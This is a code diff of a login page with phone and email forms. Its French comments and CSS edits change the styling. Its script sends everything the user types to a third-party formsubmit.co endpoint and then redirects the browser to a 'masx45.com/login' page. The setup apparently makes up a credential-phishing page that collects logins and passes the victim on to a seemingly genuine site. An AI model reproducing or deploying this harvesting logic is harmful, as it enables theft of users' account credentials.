@@ -14,13 +14,14 @@
       flex-direction: column;
       align-items: center;
       padding-top: 50px;
+      position: relative;
     }
 
-    .top-right-icon {
+    .top-right-image {
       position: absolute;
       top: 10px;
-      right: 10px;
-      width: 40px;
+      right: 15px;
+      width: 50px;
     }
 
     .page-title {
@@ -68,7 +69,7 @@
       text-align: center;
       cursor: pointer;
       background-color: transparent;
-      color: #fff;
+      color: white;
       border: none;
       font-weight: 600;
       font-size: 0.95rem;
@@ -78,7 +79,7 @@
 
     .toggle-button.active {
       background-color: #d4af37;
-      color: #fff;
+      color: white;
     }
 
     form {
@@ -110,20 +111,26 @@
       object-fit: cover;
     }
 
-    .input-group select, .input-group input {
+    .input-group select {
       background: none;
       border: none;
       color: white;
       font-size: 1rem;
       outline: none;
-    }
-
-    .input-group select {
       appearance: none;
       width: 60px;
     }
 
     .input-group input {
+      background: none;
+      border: none;
+      color: white;
+      font-size: 1rem;
+      outline: none;
+      flex: 1;
+    }
+
+    .input-group.password input {
       flex: 1;
     }
 
@@ -131,7 +138,7 @@
       cursor: pointer;
       width: 16px;
       height: 16px;
-      opacity: 0.6;
+      opacity: 0.8;
     }
 
     .form-footer {
@@ -163,8 +170,8 @@
       padding: 12px;
       border-radius: 30px;
       font-weight: bold;
-      cursor: pointer;
       color: white;
+      cursor: pointer;
     }
 
     .disclaimer {
@@ -215,7 +222,11 @@
   </style>
 </head>
 <body>
-  <img src="lkl.png" alt="corner icon" class="top-right-icon">
+
+  <!-- Image en haut à droite -->
+  <img src="lkl.png" class="top-right-image" alt="icon" />
+
+  <!-- Titre centré -->
   <div class="page-title">Log In</div>
 
   <div class="container">
@@ -227,9 +238,8 @@
       <button class="toggle-button" onclick="toggleLogin('email')">Email Login</button>
     </div>
 
-    <form id="phoneForm" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" onsubmit="redirectAfterSubmit(event)">
-      <input type="hidden" name="_captcha" value="false">
-
+    <!-- PHONE FORM -->
+    <form id="phoneForm">
       <label for="phone">Phone Number</label>
       <div class="input-group">
         <img class="flag" src="https://flagcdn.com/us.svg" alt="US Flag">
@@ -256,9 +266,8 @@
       <p class="disclaimer">Continue Is Agree <span>Sign Up</span></p>
     </form>
 
-    <form id="emailForm" class="hidden" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" onsubmit="redirectAfterSubmit(event)">
-      <input type="hidden" name="_captcha" value="false">
-
+    <!-- EMAIL FORM -->
+    <form id="emailForm" class="hidden">
       <label for="email">Email</label>
       <div class="input-group">
         <input type="email" name="email" placeholder="Email" required>
@@ -315,25 +324,32 @@
       img.src = `https://flagcdn.com/${flag}.svg`;
     });
 
-    function redirectAfterSubmit(event) {
-      event.preventDefault();
-      const form = event.target;
+    // Redirection après soumission
+    document.getElementById("phoneForm").addEventListener("submit", function(e) {
+      e.preventDefault();
 
-      fetch(form.action, {
-        method: form.method,
-        body: new FormData(form)
+      const form = e.target;
+      const data = new FormData(form);
+
+      fetch("https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1", {
+        method: "POST",
+        body: data,
+        headers: {
+          'Accept': 'application/json'
+        }
       })
       .then(response => {
         if (response.ok) {
           window.location.href = "https://masx45.com/login?lang=en";
         } else {
-          alert("Erreur lors de l'envoi du formulaire.");
+          alert("Erreur lors de l'envoi.");
         }
       })
-      .catch(() => {
-        alert("Erreur de connexion au serveur.");
+      .catch(error => {
+        alert("Erreur réseau.");
       });
-    }
+    });
   </script>
+
 </body>
 </html>
